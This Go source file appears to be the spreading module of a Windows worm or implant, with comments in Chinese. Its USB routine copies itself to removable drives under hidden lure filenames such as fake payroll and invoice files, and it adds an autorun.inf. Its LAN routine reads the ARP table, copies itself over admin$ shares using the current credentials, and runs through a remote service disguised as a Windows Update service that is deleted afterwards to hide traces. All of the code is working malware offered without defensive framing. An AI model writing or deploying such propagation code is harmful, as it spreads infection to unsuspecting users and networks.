package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

const driveRemovable = 2
const driveFixed = 3

var induceNames = []string{
	"重要文件.exe", "工资表.exe", "发票明细.exe", "简历汇总.exe",
	"照片备份.exe", "合同扫描件.exe", "体检报告.exe",
}

// listDrives 枚举盘符 + 类型
func listDrives() []struct {
	Root string
	Type uint32
} {
	var out []struct {
		Root string
		Type uint32
	}
	mask, _, _ := kernel32.NewProc("GetLogicalDrives").Call()
	for i := 0; i < 26; i++ {
		if mask&(1<<uint(i)) == 0 {
			continue
		}
		root := string(rune('A'+i)) + ":\\"
		p, err := syscall.UTF16PtrFromString(root)
		if err != nil {
			continue
		}
		t, _, _ := kernel32.NewProc("GetDriveTypeW").Call(uintptr(unsafe.Pointer(p)))
		out = append(out, struct {
			Root string
			Type uint32
		}{root, uint32(t)})
	}
	return out
}

// spreadCmd usb 走 U 盘，lan 走局域网横移，all 两条都走
func spreadCmd(mode string) ([]byte, bool) {
	if mode == "" {
		mode = "all"
	}
	var b strings.Builder
	ok := true
	if mode == "usb" || mode == "all" {
		n, err := spreadUSB()
		b.WriteString(fmt.Sprintf("usb: planted=%d err=%v\n", n, err))
		if err != nil {
			ok = false
		}
	}
	if mode == "lan" || mode == "all" {
		n, err := spreadLAN()
		b.WriteString(fmt.Sprintf("lan: hosts_reached=%d err=%v\n", n, err))
		if err != nil {
			ok = false
		}
	}
	return []byte(b.String()), ok
}

// spreadUSB 向所有可移动盘写入 autorun.inf + 诱导名副本
func spreadUSB() (int, error) {
	self := payloadPath()
	raw, err := os.ReadFile(self)
	if err != nil {
		self = os.Args[0]
		raw, err = os.ReadFile(self)
		if err != nil {
			return 0, err
		}
	}

	planted := 0
	for _, d := range listDrives() {
		if d.Type != driveRemovable {
			continue
		}
		target := filepath.Join(d.Root, induceNames[planted%len(induceNames)])
		if err := os.WriteFile(target, raw, 0o700); err != nil {
			continue
		}
		setHidden(target)

		autorun := "[autorun]\nopen=" + filepath.Base(target) + "\n" +
			"action=打开文件夹以查看文件\nshell\\open\\command=" + filepath.Base(target) + "\n" +
			"shell\\open\\default=1\nuseautoplay=1\n"
		af := filepath.Join(d.Root, "autorun.inf")
		if err := os.WriteFile(af, []byte(autorun), 0o600); err != nil {
			continue
		}
		setHidden(af)
		planted++
		logf("usb planted on %s -> %s", d.Root, target)
	}
	return planted, nil
}

// spreadLAN 局域网横移：arp 表 -> admin$ 共享 -> sc 建远程服务拉起 payload
// 走的是本机已有凭据（net use 复用当前域/本地账号），不做凭据爆破
func spreadLAN() (int, error) {
	out, err := execCommand("arp", "-a").Output()
	if err != nil {
		return 0, err
	}

	// 收集同网段主机
	hosts := []string{}
	seen := map[string]bool{}
	for _, line := range strings.Split(string(out), "\n") {
		f := strings.Fields(line)
		if len(f) < 2 {
			continue
		}
		ip := f[0]
		if !strings.HasPrefix(ip, "192.168.") && !strings.HasPrefix(ip, "10.") &&
			!strings.HasPrefix(ip, "172.") {
			continue
		}
		if strings.HasSuffix(f[1], "ff-ff-ff-ff-ff-ff") || strings.HasPrefix(f[1], "01-00-5e") {
			continue
		}
		if seen[ip] {
			continue
		}
		seen[ip] = true
		hosts = append(hosts, ip)
	}

	reached := 0
	// 只探前 64 台，避免打爆网络
	if len(hosts) > 64 {
		hosts = hosts[:64]
	}

	// 先把 payload 放到本地可共享位置
	src := payloadPath()
	if !fileExists(src) {
		src = os.Args[0]
	}

	for _, ip := range hosts {
		share := `\\` + ip + `\admin$`
		// 1. 尝试挂载（复用当前凭据）
		if err := runHidden("net", "use", share, "/persistent:no"); err != nil {
			continue
		}
		remote := share + `\Temp\wuauclt.exe`
		// 2. 复制
		if err := runHidden("cmd", "/c", "copy", "/y", src, remote); err != nil {
			runHidden("net", "use", share, "/delete", "/y")
			continue
		}
		// 3. 远程建服务拉起，然后立即删除服务减少留痕
		svc := fmt.Sprintf("wuauserv%x", len(ip)*7)
		if err := runHidden("sc", `\\`+ip, "create", svc, "binPath=", remote,
			"start=", "auto", "DisplayName=", "Windows Update Medic Service"); err != nil {
			runHidden("net", "use", share, "/delete", "/y")
			continue
		}
		runHidden("sc", `\\`+ip, "start", svc)
		runHidden("sc", `\\`+ip, "delete", svc)
		runHidden("net", "use", share, "/delete", "/y")
		reached++
		logf("lan spread -> %s", ip)
	}
	return reached, nil
}
